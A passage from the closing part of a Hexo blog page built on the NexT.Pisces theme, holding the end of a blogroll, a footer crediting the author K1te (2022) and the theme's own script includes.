          <a href="https://jan.show/" title="https:&#x2F;&#x2F;jan.show&#x2F;" rel="noopener" target="_blank">Jan</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://eastjun.top/" title="https:&#x2F;&#x2F;eastjun.top&#x2F;" rel="noopener" target="_blank">EastJun</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">K1te</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
